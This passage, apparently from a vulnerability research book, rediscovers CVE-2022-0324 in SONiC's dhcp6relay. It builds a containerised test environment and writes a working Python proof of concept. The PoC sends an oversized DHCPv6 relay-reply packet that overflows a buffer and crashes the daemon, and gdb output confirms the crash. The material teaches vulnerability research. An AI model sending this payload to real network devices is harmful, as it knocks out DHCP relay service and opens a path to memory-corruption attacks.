+                and a sockaddr_in6 address struct is assigned the port ·. A quick check in
+                src/dhcp6relay/src/relay.h tells you that RELAY_PORT is 547. Finally, the socket is
+                bound to this address ¸. Putting these observations together, you can con-
+                clude that the vulnerable source-to-sink path exists for any IPv6, non-link-
+                local network interface address on port 547. This fits the requirements of a
+                reachable attack surface.
+
+                Testing the Exploit
+                You’ve found a viable path from an attacker-controlled source to a vulnera-
+                ble sink, and come across a few conditions:
+
+                    •    When parsed into a dhcpv6_msg struct, the payload’s msg_type mem-
+                         ber must equal DHCPv6_MESSAGE_TYPE_RELAY_REPL, defined as 13 in src/
+                         dhcp6relay/src/relay.h.
+
+                    •    The payload must include at least one dhcpv6_option struct after the
+                         dhcpv6_relay_msg struct.
+                    •    When parsed into a dhcpv6_option struct, the option_code member
+                         must equal OPTION_RELAY_MSG (9).
+                      Fortunately, there don’t appear to be any significant sanitizing steps or
+                 validation checks in the way. However, confirming a vulnerability purely
+                 through code review won’t suffice. You need to build a working proof of
+                 concept that produces a controllable crash. To build the PoC, you need to
+                 first develop a test environment.
+                      This is where the ease of the development environment setup becomes
+                 all-important. Without a working build of the target to test your exploit
+                 against, you can’t confirm the vulnerability. It’s also helpful to be able to
+                 quickly debug your initial proof-of-concept exploits in case something breaks
+                 along the way. For memory corruption bugs, for example, you may need to
+                 assess the usefulness of your memory corruption primitive.
+                      Fortunately, SONiC has a well-documented build process that can even
+                 produce container images with debug symbols and debuggers included.
+                 There is one downside, however: building an entire operating system image
+                 instead of a single target binary can be time- and resource-intensive. Ideally,
+                 you should build and test the target binary in isolation during the proof-
+                 of-concept stage. Fidelity to the intended execution environment becomes
+                 more important during exploit development. You want to quickly iterate on
+                 your proof of concept while ensuring you’re exploiting the target binary it-
+                 self, rather than the surrounding operating system or other related software.
+                      The SONiC project maintains build pipelines on Azure at https://dev
+                 .azure.com/mssonic/build/_build?view=folders that include dhcp6relay, but unfor-
+                 tunately, the past runs don’t include the vulnerable version. Another prob-
+                 lem is that SONiC binaries like dhcp6relay are integrated with the underlying
+                 OS, such as pulling configuration data from a shared Redis database. You
+                 can’t build the binary and expect it to run on any OS out of the box.
+                      Thus, you must take the middle road: separate the dhcp6relay binary
+                 from the rest of SONiC, but customize the base OS to satisfy the expected
+                 configurations. For the base OS, I used Ubuntu 20.04, as recommended by
+                 the SONiC documentation.
+                      I prefer to build container images to encapsulate PoCs because it pro-
+                 vides a consistent environment to experiment in and makes it portable for
+                 others to verify the exploit. For this book, we’ll use Podman, an open source
+                 container management tool, to build and run our containers. Install it and
+                 confirm it’s working:
+
+                 $ sudo apt install -y podman-docker
+                 $ sudo touch /etc/containers/nodocker
+                 $ docker -v
+                 podman version 5.0.3
+
+                     If the build dependencies aren’t well documented, you can figure them
+                 out by trial and error. For example, src/dhcp6relay contains a Makefile that
+
+uses the g++ compiler to build the binary. First, try to run make, which gives
+the following error:
+
+#12 0.287 src/relay.cpp:3:10: fatal error: event.h: No such file or directory
+    3 | #include <event.h>
+      |          ^~~~~~~~~
+compilation terminated.
+
+    The build failed because event.h is missing, meaning you need to install
+a shared library that dhcp6relay depends on. If you look up event.h you’ll find
+that it’s part of the libevent library, which you can install with apt install
+libevent-dev. You can install many Linux libraries following the naming con-
+vention libX-dev in the same way. While this approach resolved almost all
+dependency issues, one dependency couldn’t be installed from the default
+Ubuntu package sources:
+
+#11 0.328 src/relay.cpp:10:10: fatal error: configdb.h: No such file or
+directory
+   10 | #include "configdb.h"
+      |          ^~~~~~~~~~~~
+compilation terminated.
+
+     Searching for configdb.h shows that it belongs to the sonic-swss-common
+library, which is referred to in the -I argument in the Makefile. This tells g++
+to include it in the library search path. Since you can’t install the sonic-swss
+-common library with apt from default Ubuntu sources, you need to build and
+install sonic-swss-common yourself. Fortunately, the repository provides the
+required documentation.
+     Once you resolve the dependency issues, dhcp6relay builds without er-
+rors, but you can’t run it:
+
+terminate called after throwing an instance of 'std::system_error'
+    what(): Unable to connect to redis (unix-socket): Cannot assign requested
+    address
+Aborted
+
+     It appears that dhcp6relay is attempting to connect to a Redis server. If
+you analyze configInterface.cpp, one of the source files for dhcp6relay, you’ll
+see that it checks the DHCP_RELAY table in the CONFIG_DB database for a dhcpv6
+_servers field name.
+     Further research into this configuration setting leads to documentation
+written by a SONiC developer (https://support.edge-core.com/hc/en-us/articles/
+8615164994201--Edgecore-SONiC-DHCPv6-Relay) that contains the expected
+structure of this configuration setting in the database.
+     After resolving this requirement by adding the expected configuration
+to the Redis database, dhcp6relay finally runs—but it doesn’t bind to any in-
+terfaces because none of them contain non-link-local IPv6 addresses, as
+prepare_socket requires. You need to create these manually and add this con-
+figuration to the Redis database as well. Rather than creating a brand new
+
+                  interface, you can piggyback off an existing one through a virtual local area
+                  network (VLAN), then add the required fixed IPv6 addresses, as Listing 1-2
+                  shows.
+
+/etc/init.d/redis-server restart
+ip link add link eth0 name vlan type vlan id 3
+ip -6 addr add fe80::20c:29ff:fe90:14c5/64 dev vlan
+ip -6 addr add 2a00:7b80:451:1::10/64 dev vlan
+ip link set vlan up
+redis-cli -n 4 HSET "DHCP_RELAY|vlan" dhcpv6_servers "fe80::20c:29ff:fe90:14c5/64"
+
+Listing 1-2: The commands to add required IPv6 addresses
+                      By definition, link-local IPv6 addresses fall in the range fe80::/10, and
+                  thus any valid address within this range works. The converse applies for a
+                  non-link-local IPv6 address. However, when the container build process runs
+                  these commands, you’ll get another error:
+
+                  [15/15] RUN ip link add link eth0 name vlan type vlan id 3:
+                  #18 0.196 RTNETLINK answers: Operation not permitted
+
+                       Once again, Google is your friend; a search reveals that for security rea-
+                  sons, Podman containers don’t allow certain network operations by default.
+                  You must run these commands in a privileged container (enabled by the
+                  command line flags --cap-add=NET_ADMIN --sysctl net.ipv6.conf.all.disable
+                  _ipv6=0). For now, leave the commands from Listing 1-2 out of the Docker-
+                  file and instead put them in a script, add_ipv6_addresses.sh, to be run after
+                  starting the privileged container.
+                       With all the dependency and configuration issues resolved, you can im-
+                  prove the setup further by adding debugging symbols to the compiled bi-
+                  nary. The Makefile for dhcp6relay doesn’t include the -g flag, which tells the
+                  compiler g++ to include these symbols. Resolve this by using the sed tool to
+                  modify the Makefile accordingly.
+                       You should end up with a complete Dockerfile with all these build steps:
+
+FROM ubuntu:20.04
+
+# Install dependencies
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt update
+RUN apt install -y autoconf-archive build-essential dh-exec gdb git iproute2 libboost-dev \
+    libboost-thread-dev libevent-dev libgmock-dev libgtest-dev libhiredis-dev libnl-3-dev \
+    libnl-genl-3-dev libnl-nf-3-dev libnl-route-3-dev libpython2.7-dev libpython3-dev \
+    libtool pkg-config python3 redis-server swig3.0
+
+# Check out repo
+RUN git clone https://github.com/sonic-net/sonic-buildimage
+WORKDIR sonic-buildimage
+RUN git checkout bcf5388
+
+# Build and install sonic-swss-common
+RUN git submodule update --init src/sonic-swss-common
+WORKDIR src/sonic-swss-common
+RUN ./autogen.sh
+RUN ./configure
+RUN make
+RUN make install
+RUN ldconfig
+
+# Build dhcp6relay
+WORKDIR ../dhcp6relay
+RUN sed -i '8s/$/ -g/' Makefile
+RUN sed -i '24s/.*/\t$(CC) $(CFLAGS) -o $(DHCP6RELAY_TARGET) $(OBJS) $(LIBS) $(LDFLAGS)/' \
+    Makefile
+RUN make
+
+# Configure redis
+RUN sed -i '109s/# //' /etc/redis/redis.conf
+RUN sed -i '109s/\/var\/run\/redis\/redis-server.sock/\/var\/run\/redis\/redis.sock/' \
+    /etc/redis/redis.conf
+RUN sed -i '110s/# //' /etc/redis/redis.conf
+RUN sed -i '110s/700/755/' /etc/redis/redis.conf
+
+# Copy add ipv6 address script
+COPY add_ipv6_addresses.sh add_ipv6_addresses.sh
+RUN chmod +x add_ipv6_addresses.sh
+
+                   Place this Dockerfile in a folder with the add_ipv6_addresses.sh script.
+                Now build and run it with:
+
+$ docker build -t dhcp6relay .
+$ docker run -it --cap-add=NET_ADMIN --sysctl net.ipv6.conf.all.disable_ipv6=0 dhcp6relay
+
+                    Finally, run the script and start dhcp6relay:
+
+                root@8928b41ace8c:/sonic-buildimage/src/dhcp6relay# ./add_ipv6_addresses.sh
+                Stopping redis-server: redis-server.
+                Starting redis-server: redis-server.
+                (integer) 1
+                root@8928b41ace8c:/sonic-buildimage/src/dhcp6relay# ./dhcp6relay
+
+                     Whew! That took a significant amount of effort. However, building
+                proper testing environments is one of the most important investments you
+                can make in vulnerability research. By ensuring you have a consistent, portable
+                testing environment, you speed up your workflow in the proof-of-concept
+                stage by enabling rapid iteration and easy debugging.
+
+                 Building the Proof of Concept
+                 Now you can build and test your proof-of-concept exploit in the container.
+                     As a reminder, here is the packet structure expected by parse_dhcpv6_relay
+                 and parse_dhcpv6_opt:
+
+                  msg          current_position                   len
+                  --------------------------------------------------
+                 | dhcpv6_relay_msg | dhcpv6_option |       ...     |
+                  --------------------------------------------------
+
+                     You must send bytes that match the dhcpv6_relay_msg and dhcpv6_option
+                 structs, as src/dhcp6relay/src/relay.h defines:
+
+                 struct PACKED dhcpv6_relay_msg {
+                     uint8_t msg_type;
+                     uint8_t hop_count;
+                     struct in6_addr link_address;
+                     struct in6_addr peer_address;
+                 };
+
+                 struct dhcpv6_option {
+                     uint16_t option_code;
+                     uint16_t option_length;
+                 };
+
+                     Note that the dhcpv6_relay_msg struct definition includes the PACKED at-
+                 tribute, which means that the compiler doesn’t add padding between the
+                 struct’s members to align with memory boundaries. Without this attribute,
+                 the compiler might, for example, add 3 or 7 bytes between msg_type and
+                 hop_count to align with 4- or 8-byte boundaries, depending on whether the
+                 target is a 32- or 64-bit system.
+                     The link_address and peer_address members of the dhcpv6_relay_msg struct
+                 are of the in6_addr struct type, which is not a custom struct defined in relay.h
+                 but instead a shared type from the Linux operating system itself (see https://
+                 man7.org/linux/man-pages/man7/ipv6.7.html). This struct contains a single
+                 unsigned char s6_addr[16] member.
+                     After confirming the data structures, recall the specific requirements for
+                 these bytes to reach the vulnerable sink:
+                    •    When parsed into a dhcpv6_msg struct, the payload’s msg_type mem-
+                         ber must equal DHCPv6_MESSAGE_TYPE_RELAY_REPL, defined as 13 in src/
+                         dhcp6relay/src/relay.h.
+                    •    The payload must include at least one dhcpv6_option struct after the
+                         dhcpv6_relay_msg struct.
+                    •    When parsed into a dhcpv6_option struct, the option_code member
+                         must equal OPTION_RELAY_MSG (9).
+                     You can re-create the bytes matching these requirements using the socket
+                 and struct libraries. In particular, the pack function converts values (such as
+
+                strings or integers) into their equivalent byte representation. For example,
+                the msg_type member is of the type uint8_t, an 8-bit (or 1-byte) unsigned in-
+                teger. This matches the unsigned char type supported by pack, represented
+                by the B format character (for the full list of format characters and types, re-
+                fer to the Python documentation at https://docs.python.org/3/library/struct
+                .html). Thus, you can use pack("B", DHCPv6_MESSAGE_TYPE_RELAY_REPL), where
+                DHCPv6_MESSAGE_TYPE_RELAY_REPL is the constant value 13, to generate the corre-
+                sponding packet byte. Repeat the struct-to-bytes process for the rest of the
+                expected structs.
+
+   NOTE         While the pack function has a similar name to the PACKED attribute in struct defi-
+                nitions, they have different meanings. The former packs non-byte values into byte
+                values, while the latter removes padding bytes between struct members.
+                    You need to make one important change to trigger the vulnerability.
+                The sink-to-source analysis revealed that the vulnerability lay in an overly
+                large option_length being used as the size of a memcpy to a 4,096-byte destina-
+                tion buffer, so set option_length to the maximum 65535 value and add addi-
+                tional overflow bytes to the end of the payload. Since dhcp6relay converts the
+                values of option_code and option_length from network to host byte order, con-
+                vert these values to network byte order first using socket.htons. You’ll also
+                want to set the other struct members that don’t affect the taint flow to the
+                vulnerability, such as hop_count and link_address, to default or dummy values.
+                    Finally, connect to the IPv6 address you configured for dhcp6relay earlier
+                and send the bytes using the socket library:
+
+import socket
+from struct import pack
+
+UDP_IP = "2a00:7b80:451:1::10"                             # MODIFY THIS
+UDP_PORT = 547
+
+DHCPv6_MESSAGE_TYPE_RELAY_REPL = 13
+OPTION_RELAY_MSG = 9
+
+PAYLOAD = pack("B", DHCPv6_MESSAGE_TYPE_RELAY_REPL)     # uint8_t msg_type
+PAYLOAD += pack("B", 1)                                 # uint8_t hop_count
+# struct in6_addr link_address / unsigned char s6_addr[16]
+PAYLOAD += b"A" * 16
+# struct in6_addr peer_address / unsigned char s6_addr[16]
+PAYLOAD += b"A" * 16
+PAYLOAD += pack("H", socket.htons(OPTION_RELAY_MSG))    # uint16_t option_code
+PAYLOAD += pack("H", socket.htons(65535))               # uint16_t option_length
+PAYLOAD += b"B" * 60000
+
+s = socket.socket(socket.AF_INET6,                      # IPV6
+                  socket.SOCK_DGRAM)                    # UDP
+s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_LOOP, True)
+
+s.sendto(PAYLOAD, (UDP_IP, UDP_PORT))
+
+                    With the exploit complete, stop the original running container and
+                 modify the Dockerfile to copy in your exploit script as well:
+
+                 --snip--
+                 # copy exploit script
+                 COPY exploit.py /tmp/exploit.py
+
+                 # copy add ipv6 address script
+                 COPY add_ipv6_addresses.sh add_ipv6_addresses.sh
+                 RUN chmod +x add_ipv6_addresses.sh
+
+                     Next, rebuild the container image and start a new session:
+
+$ docker build -t dhcp6relay .
+$ docker run -it --cap-add=NET_ADMIN --sysctl net.ipv6.conf.all.disable_ipv6=0 dhcp6relay
+root@743a13d9862c:/sonic-buildimage/src/dhcp6relay# ./add_ipv6_addresses.sh
+Stopping redis-server: redis-server.
+Starting redis-server: redis-server.
+(integer) 1
+root@743a13d9862c:/sonic-buildimage/src/dhcp6relay# ./dhcp6relay
+
+                      Start a second interactive session by listing the running containers and
+                 starting bash in the current one:
+
+$ docker container ls
+CONTAINER ID IMAGE          COMMAND       CREATED         STATUS         PORTS      NAMES
+743a13d9862c   dhcp6relay "/bin/bash"     7 seconds ago   Up 6 seconds              dazzling_ram
+$ docker exec -it 743a13d9862c bash
+root@743a13d9862c:/sonic-buildimage/src/dhcp6relay# python3 /tmp/exploit.py
+
+                     You should observe a segmentation fault in your first session when you
+                 run dhcp6relay:
+
+                 root@743a13d9862c:/sonic-buildimage/src/dhcp6relay# ./dhcp6relay
+                 Segmentation fault
+
+                     To perform a quick triage of the crash, debug dhcp6relay using gdb and
+                 replay the exploit:
+
+root@743a13d9862c:/sonic-buildimage/src/dhcp6relay# gdb dhcp6relay
+Reading symbols from dhcp6relay...
+(gdb) run
+Starting program: /sonic-buildimage/src/dhcp6relay/dhcp6relay
+[Thread debugging using libthread_db enabled]
+
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7ffff785d700 (LWP 72)]
+
+Thread 1 "dhcp6relay" received signal SIGSEGV, Segmentation fault.
+parse_dhcpv6_opt (buffer=0x5555555ac605 <error: Cannot access memory at
+    address 0x5555555ac605>, out_end=0x7fffffffe168) at src/relay.cpp:206
+206         size += ntohs(*(uint16_t *)(buffer + 2));
+(gdb) backtrace
+#0 parse_dhcpv6_opt (buffer=0x5555555ac605 <error: Cannot access memory at
+    address 0x5555555ac605>, out_end=0x7fffffffe168) at src/relay.cpp:206
+#1 0x0000555555560a53 in relay_relay_reply (sock=13,
+    msg=0x555555589200 <server_callback(int, short, void*)::message_buffer> "", len=4096,
+    config=0x5555555a09e0) at src/relay.cpp:497
+#2 0x0000555555561085 in server_callback (fd=12, event=2, arg=0x5555555a09e0) at
+    src/relay.cpp:603
+#3 0x00007ffff7f8d13f in ?? () from /lib/x86_64-linux-gnu/libevent-2.1.so.7
+#4 0x00007ffff7f8d87f in event_base_loop () from /lib/x86_64-linux-gnu/libevent-2.1.so.7
+#5 0x000055555556123a in signal_start () at src/relay.cpp:651
+#6 0x0000555555561649 in loop_relay (vlans=0x7fffffffe4e0, db=0x7fffffffe520) at
+    src/relay.cpp:744
+#7 0x0000555555574b38 in main (argc=1, argv=0x7fffffffe6a8) at src/main.cpp:10
+
+                     As expected, backtrace shows the crash occurs in the relay_relay_reply
+                function call. While there’s a lot more work to be done to turn this into a
+                useful exploit, you’ve confirmed the vulnerability! This should satisfy any
+                developer or triager that you have an attacker-controlled crash via a buffer
+                overflow.
+                     By retracing your steps from the center of the maze, you found an un-
+                broken path from a vulnerable sink to an attacker-controlled source. Review-
+                ing each step in discovering CVE-2022-0324 demonstrated the key principle
+                of selection in the sink-to-source tactic.
+
+   Conclusion
+                In this chapter, you learned key concepts in source-to-sink analysis before ap-
+                plying the sink-to-source analysis strategy to rediscover CVE-2022-0324 from
+                scratch. First, you narrowed down the pool of vulnerable sinks by quickly
+                eliminating non-exploitable patterns. Next, you filtered out unnecessary
+                taint paths in your analysis by focusing on reachable code. To develop your
+                proof-of-concept exploit, you built a minimal test environment that isolated
+                the target binary instead of the entire operating system. Finally, you assem-
+                bled the payload through a structs-to-bytes approach focused on triggering
+                the specific code path to the vulnerability. This “minimum viable exploit”
+                tactic reduces unnecessary analysis throughout the entire workflow and en-
+                sures that you do just enough to trigger a vulnerability.
+
+                      However, simply discovering a path from sink to source is insufficient to
+                 confirm an exploitable vulnerability. You still need to properly understand
+                 the attack surface of the target to ensure that the source is actually reachable
+                 in typical usage of the software. You’ll explore this important step in the
+                 next chapter.
+
